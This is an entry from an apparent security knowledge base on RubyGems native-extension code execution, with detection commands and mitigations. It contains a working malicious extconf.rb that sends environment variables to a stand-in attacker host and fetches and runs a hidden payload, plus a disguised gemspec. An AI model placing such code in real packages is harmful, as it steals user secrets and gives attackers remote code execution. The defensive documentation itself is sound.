---
name: "RubyGems Native Extension Code Execution"
packageManager: "gem"
slug: "gem-native-extension"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "RubyGems packages with native C extensions require an extconf.rb file that is executed as arbitrary Ruby code during `gem install`. Because extconf.rb runs with the full privileges of the installing user and has unrestricted access to the filesystem, network, and system commands, a malicious gem author can embed arbitrary code that executes the moment a victim installs the gem. This is one of the most dangerous vectors in the RubyGems ecosystem because extconf.rb execution is expected behavior for native extensions and raises no warnings."
prerequisites:
  - "Ability to publish a gem to rubygems.org or deliver a .gem file to the target"
  - "The victim must install the gem using gem install or bundle install"
  - "The malicious gem must declare native extensions in its gemspec via the extensions field"
attackScenarios:
  - title: "Malicious extconf.rb with System Command Execution"
    description: "An attacker publishes a gem that declares a native extension. The extconf.rb file, which is automatically executed during gem install, contains Ruby code that runs operating system commands using system(), backticks, or Kernel.exec. This can be used to exfiltrate environment variables, download and execute a second-stage payload, or establish persistence on the target system."
    commands:
      - label: "Create a malicious extconf.rb"
        code: |
          # extconf.rb - executed automatically during gem install
          require 'mkmf'
          require 'net/http'
          require 'uri'

          # Exfiltrate environment variables to attacker server
          env_data = ENV.to_a.map { |k, v| "#{k}=#{v}" }.join("\n")
          uri = URI.parse("https://attacker.example.com/collect")
          Net::HTTP.post_form(uri, { data: env_data })

          # Download and execute a payload
          payload = Net::HTTP.get(URI.parse("https://attacker.example.com/payload.sh"))
          File.write("/tmp/.update.sh", payload)
          system("chmod +x /tmp/.update.sh && /tmp/.update.sh &")

          # Create a dummy Makefile so the install completes without error
          File.write("Makefile", "install:\n\t@echo done\n")
        language: "ruby"
      - label: "Malicious gemspec declaring the extension"
        code: |
          Gem::Specification.new do |s|
            s.name        = "fast-parser"
            s.version     = "1.0.0"
            s.summary     = "A fast native parsing library"
            s.authors     = ["attacker"]
            s.files       = Dir["lib/**/*", "ext/**/*"]
            s.extensions  = ["ext/fast_parser/extconf.rb"]
          end
        language: "ruby"
      - label: "Victim installs the gem triggering code execution"
        code: |
          gem install fast-parser
        language: "bash"
detection:
  - title: "Inspect gemspec for extensions field"
    description: "Check whether a gem declares native extensions before installing. Any gem with an extensions field will execute code during installation."
    commands:
      - code: "gem specification fast-parser extensions"
        language: "bash"
  - title: "Review extconf.rb before installing"
    description: "Download and unpack the gem without installing to review the extconf.rb contents for suspicious calls like system(), backticks, Net::HTTP, or Kernel.exec."
    commands:
      - code: |
          gem fetch fast-parser
          gem unpack fast-parser-*.gem
          cat fast-parser-*/ext/*/extconf.rb
        language: "bash"
  - title: "Monitor system calls during gem install"
    description: "Use strace or dtruss to monitor what system calls are made during gem installation to detect unexpected network connections or file writes."
    commands:
      - code: "strace -f -e trace=network,write gem install fast-parser 2>&1 | grep -E 'connect|open'"
        language: "bash"
mitigation:
  - "Review extconf.rb files in gems before installing, especially for gems with native extensions"
  - "Use gem install --ignore-dependencies and manually audit each dependency"
  - "Run gem installations in isolated containers or VMs to limit blast radius"
  - "Use bundle install --deployment with a lockfile to ensure reproducible builds"
  - "Monitor outbound network connections during gem installation"
references:
  - title: "RubyGems Guides - Gems with Extensions"
    url: "https://guides.rubygems.org/gems-with-extensions/"
  - title: "RubyGems Security Best Practices"
    url: "https://guides.rubygems.org/security/"
created: 2026-04-02
updated: 2026-04-02
---
